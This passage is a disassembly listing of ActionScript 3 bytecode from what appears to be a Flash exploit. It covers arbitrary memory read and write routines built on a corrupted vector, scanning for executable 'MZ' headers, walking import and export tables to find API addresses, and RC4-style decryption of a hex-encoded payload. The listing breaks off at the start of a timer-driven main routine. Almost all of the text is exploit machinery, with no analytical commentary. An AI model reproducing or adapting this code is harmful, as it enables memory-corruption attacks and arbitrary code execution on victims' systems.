       157  getlocal      	7
       159  getlocal      	8
       161  setproperty   	null //nameIndex = 75
       163  getlocal      	9
       165  increment     	
       166  coerce_a      	
       167  setlocal      	9
       
       L3: 
       169  getlocal      	9
       171  pushshort     	256
       174  iflt          	L4

       178  findpropstrict	flash.utils::ByteArray //nameIndex = 8
       180  constructprop 	flash.utils::ByteArray (0) //nameIndex = 8
       183  coerce        	flash.utils::ByteArray //nameIndex = 8
       185  dup           	
       186  setlocal      	10
       188  getlex        	flash.utils::Endian //nameIndex = 91
       190  getproperty   	LITTLE_ENDIAN //nameIndex = 92
       192  setproperty   	endian //nameIndex = 93
       194  getlocal0     	
       195  getlocal1     	
       196  callproperty  	private::hexToIntArray (1) //nameIndex = 50
       199  coerce        	__AS3__.vec::Vector.<int> //nameIndex = 6
       201  setlocal      	11
       203  pushbyte      	0
       205  setlocal      	6
       207  pushbyte      	0
       209  setlocal      	12
       211  pushbyte      	0
       213  coerce_a      	
       214  setlocal      	9
       216  jump          	L5

       
       L6: 
       220  label         	
       221  getlocal      	6
       223  pushbyte      	1
       225  add           	
       226  pushshort     	255
       229  bitand        	
       230  setlocal      	6
       232  getlocal      	12
       234  getlocal2     	
       235  getlocal      	6
       237  getproperty   	null //nameIndex = 75
       239  add           	
       240  pushshort     	255
       243  bitand        	
       244  setlocal      	12
       246  getlocal2     	
       247  getlocal      	6
       249  getproperty   	null //nameIndex = 75
       251  convert_i     	
       252  setlocal      	8
       254  getlocal2     	
       255  getlocal      	6
       257  getlocal2     	
       258  getlocal      	12
       260  getproperty   	null //nameIndex = 75
       262  setproperty   	null //nameIndex = 75
       264  getlocal2     	
       265  getlocal      	12
       267  getlocal      	8
       269  setproperty   	null //nameIndex = 75
       271  getlocal2     	
       272  getlocal      	6
       274  getproperty   	null //nameIndex = 75
       276  getlocal2     	
       277  getlocal      	12
       279  getproperty   	null //nameIndex = 75
       281  add           	
       282  pushshort     	255
       285  bitand        	
       286  setlocal      	13
       288  getlocal2     	
       289  getlocal      	13
       291  getproperty   	null //nameIndex = 75
       293  convert_i     	
       294  setlocal      	8
       296  getlocal      	10
       298  getlocal      	11
       300  getlocal      	9
       302  getproperty   	null //nameIndex = 75
       304  getlocal      	8
       306  bitxor        	
       307  callpropvoid  	writeByte (1) //nameIndex = 94
       310  getlocal      	9
       312  increment     	
       313  coerce_a      	
       314  setlocal      	9
       
       L5: 
       316  getlocal      	9
       318  getlocal      	11
       320  getproperty   	length //nameIndex = 76
       322  iflt          	L6

       326  getlocal      	10
       328  returnvalue   	
     }

     function outInfo(String):void	/* disp_id=0 method_id=8 nameIndex = 52 */
     {
       // local_count=2 max_scope=1 max_stack=1 code_len=3
       // method position=5342 code position=7811
       0    getlocal0     	
       1    pushscope     	
       2    returnvoid    	
     }

     function private::read32(uint):uint	/* disp_id=0 method_id=9 nameIndex = 53 */
     {
       // local_count=2 max_scope=1 max_stack=4 code_len=62
       // method position=5347 code position=7822
       0    getlocal0     	
       1    pushscope     	
       2    getlocal1     	
       3    pushbyte      	4
       5    modulo        	
       6    iffalse       	L1

       10   pushbyte      	0
       12   returnvalue   	
       
       L1: 
       13   getlocal1     	
       14   getlocal0     	
       15   getproperty   	private::m_longArrBase //nameIndex = 30
       17   ifnge         	L2

       21   getlocal0     	
       22   getproperty   	s //nameIndex = 23
       24   getlocal0     	
       25   getproperty   	private::m_longArrIdx //nameIndex = 31
       27   getproperty   	null //nameIndex = 75
       29   getlocal1     	
       30   getlocal0     	
       31   getproperty   	private::m_longArrBase //nameIndex = 30
       33   subtract      	
       34   pushbyte      	4
       36   divide        	
       37   getproperty   	null //nameIndex = 75
       39   returnvalue   	
       
       L2: 
       40   getlocal0     	
       41   getproperty   	s //nameIndex = 23
       43   getlocal0     	
       44   getproperty   	private::m_longArrIdx //nameIndex = 31
       46   getproperty   	null //nameIndex = 75
       48   pushint       	1073741824	// 0x40000000
       50   getlocal0     	
       51   getproperty   	private::m_longArrBase //nameIndex = 30
       53   getlocal1     	
       54   subtract      	
       55   pushbyte      	4
       57   divide        	
       58   subtract      	
       59   getproperty   	null //nameIndex = 75
       61   returnvalue   	
     }

     function private::write32(uint,uint):void	/* disp_id=0 method_id=10 nameIndex = 54 */
     {
       // local_count=3 max_scope=1 max_stack=4 code_len=65
       // method position=5352 code position=7892
       0    getlocal0     	
       1    pushscope     	
       2    getlocal1     	
       3    pushbyte      	4
       5    modulo        	
       6    iffalse       	L1

       10   returnvoid    	
       
       L1: 
       11   getlocal1     	
       12   getlocal0     	
       13   getproperty   	private::m_longArrBase //nameIndex = 30
       15   ifnge         	L2

       19   getlocal0     	
       20   getproperty   	s //nameIndex = 23
       22   getlocal0     	
       23   getproperty   	private::m_longArrIdx //nameIndex = 31
       25   getproperty   	null //nameIndex = 75
       27   getlocal1     	
       28   getlocal0     	
       29   getproperty   	private::m_longArrBase //nameIndex = 30
       31   subtract      	
       32   pushbyte      	4
       34   divide        	
       35   getlocal2     	
       36   setproperty   	null //nameIndex = 75
       38   jump          	L3
       
       L2: 
       42   getlocal0     	
       43   getproperty   	s //nameIndex = 23
       45   getlocal0     	
       46   getproperty   	private::m_longArrIdx //nameIndex = 31
       48   getproperty   	null //nameIndex = 75
       50   pushint       	1073741824	// 0x40000000
       52   getlocal0     	
       53   getproperty   	private::m_longArrBase //nameIndex = 30
       55   getlocal1     	
       56   subtract      	
       57   pushbyte      	4
       59   divide        	
       60   subtract      	
       61   getlocal2     	
       62   setproperty   	null //nameIndex = 75
       
       L3: 
       64   returnvoid    	
     }

     function private::read8(uint):uint	/* disp_id=0 method_id=11 nameIndex = 55 */
     {
       // local_count=4 max_scope=1 max_stack=3 code_len=152
       // method position=5358 code position=7965
       0    getlocal0     	
       1    pushscope     	
       2    getlocal0     	
       3    getlocal1     	
       4    pushdouble    	4294967292
       6    bitand        	
       7    callproperty  	private::read32 (1) //nameIndex = 53
       10   convert_u     	
       11   setlocal2     	
       12   jump          	L1

       
       L2: 
       16   label         	
       17   getlocal2     	
       18   pushshort     	255
       21   bitand        	
       22   returnvalue   	
       
       L3: 
       23   label         	
       24   getlocal2     	
       25   pushbyte      	8
       27   rshift        	
       28   pushshort     	255
       31   bitand        	
       32   returnvalue   	
       
       L4: 
       33   label         	
       34   getlocal2     	
       35   pushbyte      	16
       37   rshift        	
       38   pushshort     	255
       41   bitand        	
       42   returnvalue   	
       
       L5: 
       43   label         	
       44   getlocal2     	
       45   pushbyte      	24
       47   rshift        	
       48   pushshort     	255
       51   bitand        	
       52   returnvalue   	
       
       L6: 
       53   label         	
       54   jump          	L7
       
       L1: 
       58   getlocal1     	
       59   pushbyte      	4
       61   modulo        	
       62   setlocal3     	
       63   pushbyte      	0
       65   getlocal3     	
       66   ifstrictne    	L8

       70   pushbyte      	0
       72   jump          	L9
       
       L8: 
       76   pushbyte      	1
       78   getlocal3     	
       79   ifstrictne    	L10

       83   pushbyte      	1
       85   jump          	L9
       
       L10: 
       89   pushbyte      	2
       91   getlocal3     	
       92   ifstrictne    	L11

       96   pushbyte      	2
       98   jump          	L9
       
       L11: 
       102  pushbyte      	3
       104  getlocal3     	
       105  ifstrictne    	L12

       109  pushbyte      	3
       111  jump          	L9
       
       L12: 
       115  jump          	L13

       119  pushbyte      	4
       121  jump          	L9
       
       L13: 
       125  pushbyte      	4
       
       L9: 
       127  kill          	3
       129  lookupswitch  	default:L6 maxcase:4 L2 L3 L4 L5 L6
       
       L7: 
       149  pushbyte      	0
       151  returnvalue   	
     }

     function private::read16(uint):uint	/* disp_id=0 method_id=12 nameIndex = 56 */
     {
       // local_count=4 max_scope=1 max_stack=3 code_len=155
       // method position=5363 code position=8126
       0    getlocal0     	
       1    pushscope     	
       2    getlocal1     	
       3    pushbyte      	2
       5    modulo        	
       6    iffalse       	L1

       10   pushbyte      	0
       12   returnvalue   	
       
       L1: 
       13   getlocal0     	
       14   getlocal1     	
       15   pushdouble    	4294967292
       17   bitand        	
       18   callproperty  	private::read32 (1) //nameIndex = 53
       21   convert_u     	
       22   setlocal2     	
       23   jump          	L2

       
       L3: 
       27   label         	
       28   getlocal2     	
       29   pushint       	65535	// 0xffff
       31   bitand        	
       32   returnvalue   	
       
       L4: 
       33   label         	
       34   getlocal2     	
       35   pushbyte      	8
       37   rshift        	
       38   pushint       	65535	// 0xffff
       40   bitand        	
       41   returnvalue   	
       
       L5: 
       42   label         	
       43   getlocal2     	
       44   pushbyte      	16
       46   rshift        	
       47   pushint       	65535	// 0xffff
       49   bitand        	
       50   returnvalue   	
       
       L6: 
       51   label         	
       52   jump          	L7

       
       L8: 
       56   label         	
       57   jump          	L7
       
       L2: 
       61   getlocal1     	
       62   pushbyte      	4
       64   modulo        	
       65   setlocal3     	
       66   pushbyte      	0
       68   getlocal3     	
       69   ifstrictne    	L9

       73   pushbyte      	0
       75   jump          	L10
       
       L9: 
       79   pushbyte      	1
       81   getlocal3     	
       82   ifstrictne    	L11

       86   pushbyte      	1
       88   jump          	L10
       
       L11: 
       92   pushbyte      	2
       94   getlocal3     	
       95   ifstrictne    	L12

       99   pushbyte      	2
       101  jump          	L10
       
       L12: 
       105  pushbyte      	3
       107  getlocal3     	
       108  ifstrictne    	L13

       112  pushbyte      	3
       114  jump          	L10
       
       L13: 
       118  jump          	L14

       122  pushbyte      	4
       124  jump          	L10
       
       L14: 
       128  pushbyte      	4
       
       L10: 
       130  kill          	3
       132  lookupswitch  	default:L8 maxcase:4 L3 L4 L5 L6 L8
       
       L7: 
       152  pushbyte      	0
       154  returnvalue   	
     }

     function private::write8(uint,uint):void	/* disp_id=0 method_id=13 nameIndex = 57 */
     {
       // local_count=6 max_scope=1 max_stack=3 code_len=214
       // method position=5368 code position=8290
       0    getlocal0     	
       1    pushscope     	
       2    pushbyte      	0
       4    convert_u     	
       5    setlocal      	4
       7    getlocal0     	
       8    getlocal1     	
       9    pushdouble    	4294967292
       11   bitand        	
       12   callproperty  	private::read32 (1) //nameIndex = 53
       15   convert_u     	
       16   setlocal3     	
       17   jump          	L1

       
       L2: 
       21   label         	
       22   getlocal3     	
       23   pushdouble    	4294967040
       25   bitand        	
       26   getlocal2     	
       27   pushshort     	255
       30   bitand        	
       31   bitor         	
       32   convert_u     	
       33   setlocal      	4
       35   jump          	L3

       
       L4: 
       39   label         	
       40   getlocal3     	
       41   pushdouble    	4294902015
       43   bitand        	
       44   getlocal2     	
       45   pushshort     	255
       48   bitand        	
       49   pushbyte      	8
       51   lshift        	
       52   bitor         	
       53   convert_u     	
       54   setlocal      	4
       56   jump          	L3

       
       L5: 
       60   label         	
       61   getlocal3     	
       62   pushdouble    	4278255615
       64   bitand        	
       65   getlocal2     	
       66   pushshort     	255
       69   bitand        	
       70   pushbyte      	16
       72   lshift        	
       73   bitor         	
       74   convert_u     	
       75   setlocal      	4
       77   jump          	L3

       
       L6: 
       81   label         	
       82   getlocal3     	
       83   pushint       	16777215	// 0xffffff
       85   bitand        	
       86   getlocal2     	
       87   pushshort     	255
       90   bitand        	
       91   pushbyte      	24
       93   lshift        	
       94   bitor         	
       95   convert_u     	
       96   setlocal      	4
       98   jump          	L3

       
       L7: 
       102  label         	
       103  jump          	L3
       
       L1: 
       107  getlocal1     	
       108  pushbyte      	4
       110  modulo        	
       111  setlocal      	5
       113  pushbyte      	0
       115  getlocal      	5
       117  ifstrictne    	L8

       121  pushbyte      	0
       123  jump          	L9
       
       L8: 
       127  pushbyte      	1
       129  getlocal      	5
       131  ifstrictne    	L10

       135  pushbyte      	1
       137  jump          	L9
       
       L10: 
       141  pushbyte      	2
       143  getlocal      	5
       145  ifstrictne    	L11

       149  pushbyte      	2
       151  jump          	L9
       
       L11: 
       155  pushbyte      	3
       157  getlocal      	5
       159  ifstrictne    	L12

       163  pushbyte      	3
       165  jump          	L9
       
       L12: 
       169  jump          	L13

       173  pushbyte      	4
       175  jump          	L9
       
       L13: 
       179  pushbyte      	4
       
       L9: 
       181  kill          	5
       183  lookupswitch  	default:L7 maxcase:4 L2 L4 L5 L6 L7
       
       L3: 
       203  getlocal0     	
       204  getlocal1     	
       205  pushdouble    	4294967292
       207  bitand        	
       208  getlocal      	4
       210  callpropvoid  	private::write32 (2) //nameIndex = 54
       213  returnvoid    	
     }

     function private::writeBytes(uint,flash.utils::ByteArray):void	/* disp_id=0 method_id=14 nameIndex = 58 */
     {
       // local_count=5 max_scope=1 max_stack=4 code_len=127
       // method position=5374 code position=8513
       0    getlocal0     	
       1    pushscope     	
       2    pushbyte      	0
       4    convert_u     	
       5    setlocal      	4
       7    pushbyte      	0
       9    coerce_a      	
       10   setlocal3     	
       11   jump          	L1

       
       L2: 
       15   label         	
       16   getlocal2     	
       17   getlocal3     	
       18   getproperty   	null //nameIndex = 75
       20   pushshort     	255
       23   bitand        	
       24   getlocal2     	
       25   getlocal3     	
       26   pushbyte      	1
       28   add           	
       29   getproperty   	null //nameIndex = 75
       31   pushshort     	255
       34   bitand        	
       35   pushbyte      	8
       37   lshift        	
       38   bitor         	
       39   getlocal2     	
       40   getlocal3     	
       41   pushbyte      	2
       43   add           	
       44   getproperty   	null //nameIndex = 75
       46   pushshort     	255
       49   bitand        	
       50   pushbyte      	16
       52   lshift        	
       53   bitor         	
       54   getlocal2     	
       55   getlocal3     	
       56   pushbyte      	3
       58   add           	
       59   getproperty   	null //nameIndex = 75
       61   pushshort     	255
       64   bitand        	
       65   pushbyte      	24
       67   lshift        	
       68   bitor         	
       69   convert_u     	
       70   setlocal      	4
       72   getlocal0     	
       73   getlocal1     	
       74   getlocal3     	
       75   add           	
       76   getlocal      	4
       78   callpropvoid  	private::write32 (2) //nameIndex = 54
       81   getlocal3     	
       82   pushbyte      	4
       84   add           	
       85   coerce_a      	
       86   setlocal3     	
       
       L1: 
       87   getlocal3     	
       88   pushbyte      	3
       90   add           	
       91   getlocal2     	
       92   getproperty   	length //nameIndex = 76
       94   iflt          	L2

       98   jump          	L3

       
       L4: 
       102  label         	
       103  getlocal0     	
       104  getlocal1     	
       105  getlocal3     	
       106  add           	
       107  getlocal2     	
       108  getlocal3     	
       109  getproperty   	null //nameIndex = 75
       111  callpropvoid  	private::write8 (2) //nameIndex = 57
       114  getlocal3     	
       115  increment     	
       116  coerce_a      	
       117  setlocal3     	
       
       L3: 
       118  getlocal3     	
       119  getlocal2     	
       120  getproperty   	length //nameIndex = 76
       122  iflt          	L4

       126  returnvoid    	
     }

     function private::writeUnicodeString(uint,String):void	/* disp_id=0 method_id=15 nameIndex = 59 */
     {
       // local_count=5 max_scope=1 max_stack=3 code_len=60
       // method position=5380 code position=8648
       0    getlocal0     	
       1    pushscope     	
       2    findpropstrict	flash.utils::ByteArray //nameIndex = 8
       4    constructprop 	flash.utils::ByteArray (0) //nameIndex = 8
       7    coerce        	flash.utils::ByteArray //nameIndex = 8
       9    setlocal3     	
       10   getlocal3     	
       11   getlex        	flash.utils::Endian //nameIndex = 91
       13   getproperty   	LITTLE_ENDIAN //nameIndex = 92
       15   setproperty   	endian //nameIndex = 93
       17   pushbyte      	0
       19   setlocal      	4
       21   jump          	L1

       
       L2: 
       25   label         	
       26   getlocal3     	
       27   getlocal2     	
       28   getlocal      	4
       30   callproperty  	http://adobe.com/AS3/2006/builtin::charCodeAt (1) //nameIndex = 95
       33   callpropvoid  	writeShort (1) //nameIndex = 96
       36   inclocal_i    	4
       
       L1: 
       38   getlocal      	4
       40   getlocal2     	
       41   getproperty   	length //nameIndex = 76
       43   iflt          	L2

       47   getlocal3     	
       48   pushbyte      	0
       50   callpropvoid  	writeShort (1) //nameIndex = 96
       53   getlocal0     	
       54   getlocal1     	
       55   getlocal3     	
       56   callpropvoid  	private::writeBytes (2) //nameIndex = 58
       59   returnvoid    	
     }

     function private::writeAsciiString(uint,String):void	/* disp_id=0 method_id=16 nameIndex = 60 */
     {
       // local_count=5 max_scope=1 max_stack=3 code_len=39
       // method position=5386 code position=8716
       0    getlocal0     	
       1    pushscope     	
       2    findpropstrict	flash.utils::ByteArray //nameIndex = 8
       4    constructprop 	flash.utils::ByteArray (0) //nameIndex = 8
       7    coerce        	flash.utils::ByteArray //nameIndex = 8
       9    setlocal3     	
       10   getlocal3     	
       11   getlex        	flash.utils::Endian //nameIndex = 91
       13   getproperty   	LITTLE_ENDIAN //nameIndex = 92
       15   setproperty   	endian //nameIndex = 93
       17   pushbyte      	0
       19   setlocal      	4
       21   getlocal3     	
       22   getlocal2     	
       23   callpropvoid  	writeUTFBytes (1) //nameIndex = 97
       26   getlocal3     	
       27   pushbyte      	0
       29   callpropvoid  	writeByte (1) //nameIndex = 94
       32   getlocal0     	
       33   getlocal1     	
       34   getlocal3     	
       35   callpropvoid  	private::writeBytes (2) //nameIndex = 58
       38   returnvoid    	
     }

     function private::asciiStrEqual(uint,String):Boolean	/* disp_id=0 method_id=17 nameIndex = 61 */
     {
       // local_count=5 max_scope=1 max_stack=3 code_len=63
       // method position=5392 code position=8763
       0    getlocal0     	
       1    pushscope     	
       2    findpropstrict	flash.utils::ByteArray //nameIndex = 8
       4    constructprop 	flash.utils::ByteArray (0) //nameIndex = 8
       7    coerce        	flash.utils::ByteArray //nameIndex = 8
       9    setlocal3     	
       10   getlocal3     	
       11   getlex        	flash.utils::Endian //nameIndex = 91
       13   getproperty   	LITTLE_ENDIAN //nameIndex = 92
       15   setproperty   	endian //nameIndex = 93
       17   getlocal3     	
       18   getlocal2     	
       19   callpropvoid  	writeUTFBytes (1) //nameIndex = 97
       22   pushbyte      	0
       24   setlocal      	4
       26   jump          	L1

       
       L2: 
       30   label         	
       31   getlocal0     	
       32   getlocal1     	
       33   getlocal      	4
       35   add           	
       36   callproperty  	private::read8 (1) //nameIndex = 55
       39   getlocal3     	
       40   getlocal      	4
       42   getproperty   	null //nameIndex = 75
       44   ifeq          	L3

       48   pushfalse     	
       49   returnvalue   	
       
       L3: 
       50   inclocal_i    	4
       
       L1: 
       52   getlocal      	4
       54   getlocal3     	
       55   getproperty   	length //nameIndex = 76
       57   iflt          	L2

       61   pushtrue      	
       62   returnvalue   	
     }

     function private::getModuleBase(uint):uint	/* disp_id=0 method_id=18 nameIndex = 62 */
     {
       // local_count=3 max_scope=1 max_stack=2 code_len=47
       // method position=5398 code position=8834
       0    getlocal0     	
       1    pushscope     	
       2    getlocal1     	
       3    pushdouble    	4294901760
       5    bitand        	
       6    coerce_a      	
       7    setlocal2     	
       8    jump          	L1

       
       L2: 
       12   label         	
       13   getlocal0     	
       14   getlocal2     	
       15   callproperty  	private::read32 (1) //nameIndex = 53
       18   pushint       	65535	// 0xffff
       20   bitand        	
       21   pushshort     	23117
       25   ifne          	L3

       29   getlocal2     	
       30   returnvalue   	
       
       L3: 
       31   getlocal2     	
       32   pushint       	65536	// 0x10000
       34   subtract      	
       35   coerce_a      	
       36   setlocal2     	
       
       L1: 
       37   getlocal2     	
       38   pushbyte      	0
       40   ifgt          	L2

       44   pushbyte      	0
       46   returnvalue   	
     }

     function private::getModuleBaseFromIAT(uint,String,uint):uint	/* disp_id=0 method_id=19 nameIndex = 63 */
     {
       // local_count=10 max_scope=3 max_stack=6 code_len=189
       // method position=5403 code position=8889
       0    getlocal0     	
       1    pushscope     	
       2    pushbyte      	0
       4    convert_u     	
       5    setlocal      	6
       7    pushbyte      	0
       9    convert_u     	
       10   setlocal      	7
       12   pushbyte      	0
       14   convert_u     	
       15   setlocal      	8
       17   getlocal1     	
       18   getlocal0     	
       19   getlocal1     	
       20   getlocal0     	
       21   getlocal1     	
       22   pushbyte      	60
       24   add           	
       25   callproperty  	private::read32 (1) //nameIndex = 53
       28   add           	
       29   pushshort     	128
       32   add           	
       33   callproperty  	private::read32 (1) //nameIndex = 53
       36   add           	
       37   convert_u     	
       38   dup           	
       39   setlocal      	4
       41   convert_u     	
       42   setlocal      	5
       44   jump          	L1

       
       L2: 
       48   label         	
       49   getlocal1     	
       50   getlocal0     	
       51   getlocal      	5
       53   pushbyte      	12
       55   add           	
       56   callproperty  	private::read32 (1) //nameIndex = 53
       59   add           	
       60   convert_u     	
       61   setlocal      	6
       63   getlocal0     	
       64   getlocal      	6
       66   getlocal2     	
       67   callproperty  	private::asciiStrEqual (2) //nameIndex = 61
       70   iffalse       	L3

       74   getlocal1     	
       75   getlocal0     	
       76   getlocal      	5
       78   pushbyte      	16
       80   add           	
       81   callproperty  	private::read32 (1) //nameIndex = 53
       84   add           	
       85   convert_u     	
       86   setlocal      	7
       88   getlocal3     	
       89   pushbyte      	4
       91   multiply      	
       92   getlocal      	7
       94   add           	
       95   convert_u     	
       96   setlocal      	7
       98   getlocal0     	
       99   getlocal      	7
       101  callproperty  	private::read32 (1) //nameIndex = 53
       104  convert_u     	
       105  setlocal      	8
       107  jump          	L4

       
       L5: 
       111  label         	
       112  getlocal      	7
       114  pushbyte      	4
       116  add           	
       117  convert_u     	
       118  setlocal      	7
       120  getlocal0     	
       121  getlocal      	7
       123  callproperty  	private::read32 (1) //nameIndex = 53
       126  convert_u     	
       127  setlocal      	8
       
       L4: 
       129  pushbyte      	0
       131  getlocal      	8
       133  ifeq          	L5

       137  getlocal0     	
       138  getlocal      	8
       140  pushdouble    	4294901760
       142  bitand        	
       143  callproperty  	private::getModuleBase (1) //nameIndex = 62
       146  returnvalue   	
       
       L3: 
       147  jump          	L6

       151  getlocal0     	
       152  pushscope     	
       153  newcatch      	0
       155  dup           	
       156  setlocal      	9
       158  dup           	
       159  pushscope     	
       160  swap          	
       161  setslot       	1
       163  popscope      	
       164  kill          	9
       
       L6: 
       166  getlocal      	5
       168  pushbyte      	20
       170  add           	
       171  convert_u     	
       172  setlocal      	5
       
       L1: 
       174  getlocal      	5
       176  getlocal      	4
       178  pushshort     	256
       181  add           	
       182  iflt          	L2

       186  pushbyte      	0
       188  returnvalue   	
     }

     function private::getProcAddr(uint,String):uint	/* disp_id=0 method_id=20 nameIndex = 64 */
     {
       // local_count=12 max_scope=1 max_stack=6 code_len=176
       // method position=5410 code position=9094
       0    getlocal0     	
       1    pushscope     	
       2    pushundefined 	
       3    coerce_a      	
       4    setlocal      	9
       6    pushbyte      	0
       8    convert_u     	
       9    setlocal      	10
       11   pushbyte      	0
       13   convert_u     	
       14   setlocal      	11
       16   getlocal1     	
       17   getlocal0     	
       18   getlocal1     	
       19   getlocal0     	
       20   getlocal1     	
       21   pushbyte      	60
       23   add           	
       24   callproperty  	private::read32 (1) //nameIndex = 53
       27   add           	
       28   pushbyte      	120
       30   add           	
       31   callproperty  	private::read32 (1) //nameIndex = 53
       34   add           	
       35   convert_u     	
       36   setlocal3     	
       37   getlocal0     	
       38   getlocal3     	
       39   pushbyte      	24
       41   add           	
       42   callproperty  	private::read32 (1) //nameIndex = 53
       45   convert_u     	
       46   setlocal      	4
       48   getlocal1     	
       49   getlocal0     	
       50   getlocal3     	
       51   pushbyte      	28
       53   add           	
       54   callproperty  	private::read32 (1) //nameIndex = 53
       57   add           	
       58   convert_u     	
       59   setlocal      	5
       61   getlocal1     	
       62   getlocal0     	
       63   getlocal3     	
       64   pushbyte      	32
       66   add           	
       67   callproperty  	private::read32 (1) //nameIndex = 53
       70   add           	
       71   convert_u     	
       72   setlocal      	6
       74   getlocal1     	
       75   getlocal0     	
       76   getlocal3     	
       77   pushbyte      	36
       79   add           	
       80   callproperty  	private::read32 (1) //nameIndex = 53
       83   add           	
       84   convert_u     	
       85   setlocal      	7
       87   pushbyte      	0
       89   coerce_a      	
       90   setlocal      	8
       92   jump          	L1

       
       L2: 
       96   label         	
       97   getlocal0     	
       98   getlocal      	6
       100  getlocal      	8
       102  pushbyte      	4
       104  multiply      	
       105  add           	
       106  callproperty  	private::read32 (1) //nameIndex = 53
       109  getlocal1     	
       110  add           	
       111  coerce_a      	
       112  setlocal      	9
       114  getlocal0     	
       115  getlocal      	9
       117  getlocal2     	
       118  callproperty  	private::asciiStrEqual (2) //nameIndex = 61
       121  iffalse       	L3

       125  getlocal0     	
       126  getlocal      	7
       128  getlocal      	8
       130  pushbyte      	2
       132  multiply      	
       133  add           	
       134  callproperty  	private::read16 (1) //nameIndex = 56
       137  convert_u     	
       138  setlocal      	10
       140  getlocal0     	
       141  getlocal      	5
       143  getlocal      	10
       145  pushbyte      	4
       147  multiply      	
       148  add           	
       149  callproperty  	private::read32 (1) //nameIndex = 53
       152  getlocal1     	
       153  add           	
       154  convert_u     	
       155  dup           	
       156  setlocal      	11
       158  returnvalue   	
       
       L3: 
       159  getlocal      	8
       161  increment     	
       162  coerce_a      	
       163  setlocal      	8
       
       L1: 
       165  getlocal      	8
       167  getlocal      	4
       169  iflt          	L2

       173  pushbyte      	0
       175  returnvalue   	
     }

     function private::searchBytes(flash.utils::ByteArray,uint,uint):uint	/* disp_id=0 method_id=21 nameIndex = 65 */
     {
       // local_count=6 max_scope=1 max_stack=3 code_len=108
       // method position=5416 code position=9279
       0    getlocal0     	
       1    pushscope     	
       2    pushbyte      	0
       4    setlocal      	5
       6    getlocal2     	
       7    getlocal3     	
       8    greaterequals 	
       9    dup           	
       10   iftrue        	L1

       14   pop           	
       15   getlocal2     	
       16   getlocal1     	
       17   getproperty   	length //nameIndex = 76
       19   add           	
       20   getlocal3     	
       21   greaterthan   	
       
       L1: 
       22   iffalse       	L2

       26   pushbyte      	0
       28   returnvalue   	
       
       L2: 
       29   getlocal2     	
       30   convert_u     	
       31   setlocal      	4
       33   jump          	L3

       
       L4: 
       37   label         	
       38   pushbyte      	0
       40   setlocal      	5
       42   jump          	L5

       
       L6: 
       46   label         	
       47   getlocal0     	
       48   getlocal      	4
       50   getlocal      	5
       52   add           	
       53   callproperty  	private::read8 (1) //nameIndex = 55
       56   getlocal1     	
       57   getlocal      	5
       59   getproperty   	null //nameIndex = 75
       61   ifeq          	L7

       65   jump          	L8
       
       L7: 
       69   inclocal_i    	5
       
       L5: 
       71   getlocal      	5
       73   getlocal1     	
       74   getproperty   	length //nameIndex = 76
       76   iflt          	L6
       
       L8: 
       80   getlocal      	5
       82   getlocal1     	
       83   getproperty   	length //nameIndex = 76
       85   ifne          	L9

       89   getlocal      	4
       91   returnvalue   	
       
       L9: 
       92   getlocal      	4
       94   increment     	
       95   convert_u     	
       96   setlocal      	4
       
       L3: 
       98   getlocal      	4
       100  getlocal3     	
       101  iflt          	L4

       105  pushbyte      	0
       107  returnvalue   	
     }

     function private::hexToBin(String):flash.utils::ByteArray	/* disp_id=0 method_id=22 nameIndex = 66 */
     {
       // local_count=6 max_scope=1 max_stack=4 code_len=83
       // method position=5423 code position=9395
       0    getlocal0     	
       1    pushscope     	
       2    pushnull      	
       3    coerce_a      	
       4    setlocal2     	
       5    findpropstrict	flash.utils::ByteArray //nameIndex = 8
       7    constructprop 	flash.utils::ByteArray (0) //nameIndex = 8
       10   coerce_a      	
       11   setlocal3     	
       12   getlocal1     	
       13   getproperty   	length //nameIndex = 76
       15   coerce_a      	
       16   setlocal      	4
       18   pushbyte      	0
       20   coerce_a      	
       21   setlocal      	5
       23   getlocal3     	
       24   getlex        	flash.utils::Endian //nameIndex = 91
       26   getproperty   	LITTLE_ENDIAN //nameIndex = 92
       28   setproperty   	endian //nameIndex = 100
       30   jump          	L1

       
       L2: 
       34   label         	
       35   getlocal1     	
       36   getlocal      	5
       38   callproperty  	http://adobe.com/AS3/2006/builtin::charAt (1) //nameIndex = 89
       41   getlocal1     	
       42   getlocal      	5
       44   pushbyte      	1
       46   add           	
       47   callproperty  	http://adobe.com/AS3/2006/builtin::charAt (1) //nameIndex = 89
       50   add           	
       51   coerce_a      	
       52   setlocal2     	
       53   getlocal3     	
       54   findpropstrict	parseInt //nameIndex = 90
       56   getlocal2     	
       57   pushbyte      	16
       59   callproperty  	parseInt (2) //nameIndex = 90
       62   callpropvoid  	writeByte (1) //nameIndex = 101
       65   getlocal      	5
       67   pushbyte      	2
       69   add           	
       70   coerce_a      	
       71   setlocal      	5
       
       L1: 
       73   getlocal      	5
       75   getlocal      	4
       77   iflt          	L2

       81   getlocal3     	
       82   returnvalue   	
     }

     function private::proc(flash.events::TimerEvent):void	/* disp_id=0 method_id=23 nameIndex = 67 */
     {
       // local_count=46 max_scope=3 max_stack=5 code_len=1936
       // method position=5428 code position=9486
       0    getlocal0     	
       1    pushscope     	
       2    pushbyte      	0
       4    convert_u     	
       5    setlocal2     	
       6    pushbyte      	0
       8    convert_u     	
       9    setlocal3     	
       10   pushbyte      	0
       12   convert_u     	
       13   setlocal      	4
       15   pushbyte      	0
       17   convert_u     	
       18   setlocal      	5
       20   pushbyte      	0
       22   convert_u     	
       23   setlocal      	6
       25   pushbyte      	0
       27   convert_u     	
       28   setlocal      	7
       30   pushbyte      	0
       32   convert_u     	
       33   setlocal      	8
       35   pushbyte      	0
       37   convert_u     	
       38   setlocal      	9
       40   pushbyte      	0
       42   convert_u     	
       43   setlocal      	10
       45   pushbyte      	0
       47   convert_u     	
       48   setlocal      	11
       50   pushbyte      	0
       52   convert_u     	
       53   setlocal      	12
       55   pushbyte      	0
       57   convert_u     	
       58   setlocal      	13
       60   pushbyte      	0
       62   convert_u     	
       63   setlocal      	14
       65   pushbyte      	0
       67   convert_u     	
       68   setlocal      	15
       70   pushbyte      	0
       72   convert_u     	
       73   setlocal      	16
       75   pushbyte      	0
       77   convert_u     	
       78   setlocal      	17
       80   pushbyte      	0
       82   convert_u     	
       83   setlocal      	18
       85   pushbyte      	0
       87   convert_u     	
       88   setlocal      	19
       90   pushnull      	
       91   coerce_s      	
       92   setlocal      	20
       94   pushbyte      	0
       96   convert_u     	
       97   setlocal      	21
       99   pushbyte      	0
       101  convert_u     	
       102  setlocal      	22
       104  pushbyte      	0
       106  convert_u     	
       107  setlocal      	23
       109  pushbyte      	0
       111  setlocal      	25
       113  pushbyte      	0
       115  setlocal      	26
       117  pushbyte      	0
       119  setlocal      	27
